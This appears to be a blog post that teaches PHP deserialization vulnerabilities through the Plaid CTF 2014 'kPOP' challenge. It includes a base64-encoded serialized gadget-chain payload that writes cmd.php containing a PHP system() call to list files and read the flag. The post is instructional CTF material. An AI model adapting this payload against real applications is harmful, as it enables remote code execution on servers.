---
layout:     post
title:      Exploring Deserialization Attacks and Their Effects
date: 2024-09-07 12:00
summary:    Uncover how deserialization attacks work with real-world examples and learn how to mitigate their risks.
categories: security
---

Cheers!
<br />
I took a short break and returned with a new security post :relaxed:
<br /><br />
Let's discuss today on what Deserialization is and how to identify it, as it can sometimes lead to Remote Code Execution (RCE), Privilege Escalation and additional vulnerabilities with severe impacts on the entire application.
<br /><br />
This time, I was digging deep inside the Internet and discovered a cool Deseralization challenge from '<a href="https://ctftime.org/event/119">Plaid CTF 2014</a>' which called 'the kPOP challenge' that will simplify our learning process on this vulnerability in this blog post.
<br /><br />
The CTF source code files can be downloaded directly from <a href="https://github.com/pwning/plaidctf2014/tree/master/web/kPOP">plaidctf2014 </a> Github repo.

<p align="center">
  <img src="{{ site.url }}/images/i_dunno_what_to_choose.jpeg" alt="i_dunno_what_to_choose" />
</p>

<br />
In PHP, some applications involve handling serialized data, often encoded in base64 format, to function correctly. It's crucial to examine how this data is unserialized to ensure it is done safely. We want to look after instances where data is unserialized without proper validation or where serialized input is trusted directly. Key indicators of potential vulnerabilities include the use of functions like `unserialize()` and `serialize()` with user-provided input, which can expose the application to risks if not carefully managed.
<br /><br />
The first step is to enumerate the classes used in the application and examine their relationships and correlations. This can be easily achieved by using `CTRL+SHIFT+F` in Visual Studio Code:
<br />
<p align="center">
  <img src="{{ site.url }}/images/vscode_classes_list.png" alt="vscode_classes_list" />
</p>

To better understand the relationships between kPOP classes in a more visual way, we can create a UML diagram. This diagram represents the system's structure and design, illustrating the various classes and their relationships, including inheritance, associations, and dependencies:
<br />

<p align="center">
  <img src="{{ site.url }}/images/kpop_uml.png" alt="kpop_uml" />
</p>
<p align="center">kPOP UML Diagram</p>

The final serialized payload will be as follows, in Base64 format:

`Tzo2OiJMeXJpY3MiOjI6e3M6OToiACoAbHlyaWNzIjtzOjEyOiJzaGVsbF9seXJpY3MiO3M6NzoiACoAc29uZyI7Tzo0OiJTb25nIjo0OntzOjk6IgAqAGxvZ2dlciI7Tzo2OiJMb2dnZXIiOjE6e3M6MTI6IgAqAGxvZ3dyaXRlciI7TzoxNDoiTG9nV3JpdGVyX0ZpbGUiOjI6e3M6MTE6IgAqAGZpbGVuYW1lIjtzOjc6ImNtZC5waHAiO3M6OToiACoAZm9ybWF0IjtPOjEzOiJMb2dGaWxlRm9ybWF0IjoyOntzOjEwOiIAKgBmaWx0ZXJzIjthOjE6e2k6MDtPOjEyOiJPdXRwdXRGaWx0ZXIiOjI6e3M6MTU6IgAqAG1hdGNoUGF0dGVybiI7czoxOToiL1xbaVxdKC4qKVxbXC9pXF0vaSI7czoxNDoiACoAcmVwbGFjZW1lbnQiO3M6OToiPGk+XDE8L2k+Ijt9fXM6NzoiACoAZW5kbCI7czoxOiIKIjt9fX1zOjc6IgAqAG5hbWUiO3M6MzU6Ijw/cGhwIHN5c3RlbSgnbHMgLWw7IGNhdCBmbGFnJyk7ID8+IjtzOjg6IgAqAGdyb3VwIjtzOjExOiJzaGVsbF9ncm91cCI7czo2OiIAKgB1cmwiO3M6MTk6Imh0dHBzOlwvXC9zaGVsbC5jb20iO319`

<br />

We can use the PlantUML Editor[^1] to visualize the decoded payload in a Class Object format:
<br />

<p align="center">
  <img src="{{ site.url }}/images/unserialize_poc.png" alt="unserialize_poc" />
</p>
<p align="center">unserialize.com</p>

### Conclusion

PlantUML Editor[^1]
<br />
Online PHP Unserializer[^2]

<br />
Thanks for reading!

<br />
__Disclaimer:__ This material is for informational purposes only, and should not be construed as legal advice or opinion. For actual legal advice, you should consult with professional legal services.

---

[^1]: [PlantUML Online Editor](https://www.plantuml.com/)
[^2]: [Online PHP Unserializer](https://www.unserialize.com/)